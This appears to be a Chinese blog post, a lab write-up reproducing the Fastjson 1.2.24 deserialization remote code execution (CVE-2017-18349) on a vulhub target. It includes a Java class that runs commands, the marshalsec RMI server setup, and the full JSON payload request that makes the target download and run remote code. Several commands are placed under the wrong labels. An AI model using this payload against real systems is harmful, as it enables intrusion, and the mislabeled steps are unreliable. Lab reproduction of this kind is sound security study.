<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/T3RdLs25_EMHI2qR6N-h3Q)

0x01 前言
-------

FastJson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。

0x2 影响范围
--------

影响范围：Fastjson1.2.24 及之前版本。

0x03 环境准备
---------

### 3.1 目标环境

#### 3.1.1 靶场环境

vulhub 靶场环境：CVE-2017-18349

#### 3.1.2 靶机：

```
Ubuntu20.04  ip：192.168.182.128  作用：搭建web服务器和RMI服务，nc接受反弹shell

kali ip :192.168.182.129          作用：靶机，基于vulhub漏洞集成环境运行靶场容器

win10物理机ip：192.168.43.189       作用：使用burpsuit发送POC测试
```

#### 3.1.3 踩坑点

如果靶场环境启动不成功，以下两个方法供借鉴

*   更改 docker 源为国内源
    
*   使用 root 权限重启 docker
    

0x04 漏洞复现
---------

### 4.1 漏洞利用

为了能成功的利用 fj1.2.24**（以下简称 fj24）**反序列化漏洞，需要提前在 Ubuntu20.04 虚拟机（可自行选择主机系统）上搭建 Web 服务和 RMI 服务，通过 win10 物理机向 fj 服务器 POST 提交 Poc 后，使得靶机访问远程 RMI 服务，随后 RMI 将请求重定向到 Web 服务器后存放在 Web 服务器中的恶意 Java 代码（已编辑的反序列化类），从而成功实现远程命令执行。

ubuntu20.04 虚拟机生成一个带命令执行的类（或在物理机生成传入），需要安装 Java 环境（Ubuntu20.04 默认存在 jdk1.8 版本）

新建一个 Java 脚本，命名为 TouchFile.java，将想执行的命令写入代码中，并进行编译。

```
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/successs"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

编译代码如下:

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “http://192.168.182.128:8000/#TouchFile”
```

### 4.2 python 开启 http 服务

python2.x 执行命令为

```
POST / HTTP/1.1
Host: 192.168.182.129:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.182.128:1099/TouchFile",
        "autoCommit":true
    }
}
```

python3.x 执行命令为

```
python3 -m http.server 8000
```

踩坑点: win10 物理机 ping 不通虚拟机下的 ip，我虚拟机以前的网络配的很乱，VM 网络还原默认配置，这个问题就解决。

### 4.3 下载反序列化利用工具

使用 Java 反序列化利用工具 marshalsec 辅助开启 RMI 环境，需要下载 marshalsec、mvn。

下载 marshalsec：git clone https://github.com/mbechler/marshalsec

下载 maven:apt-get install maven

查看 mvn 版本

```
mvn -v
```

我的 mvn 版本是：**3.6.3**

  **踩坑点**：一般用默认的 mvn 的源创建项目都会失败，我 win10Ubuntu20.04 都试过失败，把源换成国内源，我用的是阿里云的源。

maven 大多数情况下得换源，不换源一直都是 build false。

Ubuntu 修改 maven 源地址教程：https://blog.csdn.net/weixin_33849942/article/details/92348061

进入 marshalsec 目录，执行 mvn clean package -DskipTests 编译生成的 marshalsec 的 jar 包。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRjqqUba0xj1yAwTlAfyNAT56EBHJxowoZVVjnFN3DicibF9UzbLTibpH2w/640?wx_fmt=png)01

进入 target 目录，借助 marshalsec 项目，启动一个 RMI 服务器，监听端口，并制定加载远程类 TouchFile.class, 执行:

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer “http://192.168.182.128:8000/#TouchFile”
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRVMgyeuQkaxR9DOaShmaK5LGz4weiaXVHhtR5Qqk4y569VsoLPtpo9gQ/640?wx_fmt=png)02

### 4.4 远程执行命令场景一

物理机访问靶场 URL http://192.168.182.129:8090/，使用 bp 发送构造数据包

```
POST / HTTP/1.1
Host: 192.168.182.129:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 160
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.182.128:1099/TouchFile",
        "autoCommit":true
    }
}
```

运行 payload，成功后，服务端响应码 500。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugR2ibo2ibL1rXicCkfxGiaCPZlTPkicZecNhZrBDhibD6cqxqhb2LDric1J2w7A/640?wx_fmt=png)03

在监听端口查看到已建立连接。

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRYjaxT1Rlfz7qSYB7VxMYff7pRb44QT9QAuBJ8dJ3ZV1ITT5rmSUmtw/640?wx_fmt=png)04

进入靶机查看命令是否执行成功，输入命令进入 fj 环境容器执行 bash:

踩坑点：查看容器 id

```
docker pa -a
```

列出容器：

```
docker ps
```

查看容器 id

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRjwoflPsMd2iaicmYluiaVOYyCXSj3o3CM0aFwicjjIia9OyuSUwziciaow2mw/640?wx_fmt=png)05

执行以下命令查看远程命令是否创建

```
docker exec -it 7f8b773067b8 /bin/bash
```

![](https://mmbiz.qpic.cn/mmbiz_png/auiclCmzibWgz05SLspBN2dej19jbLOugRIO9nUyiay5LOicXOVnUFOWE1WUmM1Kb3kUGJhu8Ua7xN31ea3ACsjbtQ/640?wx_fmt=png)06

### 4.5 远程执行命令场景二

修改 TouchFile.java 代码进行编译，进行 dnslog 访问。

  **踩坑点**：注意 python3 -m http.server 一定要在 TouchFile.class 目录下监听！！！不然监听不成功

TouchFile.java 某一部分代码改成如下：

```
String[] commands = {"ping", "bvgngj.dnslog.cn"}
```

使用 bp 抓包加载 payload，成功解析 dnslog 域名：bvgngj.dnslog.cn

0x4 总结
------

FastJson 漏洞是今年来爆出的高危漏洞，修复建议是将 FastJson 更新到最新版本。

公众号

![](https://mmbiz.qpic.cn/mmbiz_gif/6aVaON9Kibf7jNIAOgqwdCv2J77riaDsoMDSpLqoaUiao8aD9r3FwP0gFU2Psuqv6SgVAPhib8hibvO8CaEM8wu1Arw/640?wx_fmt=gif)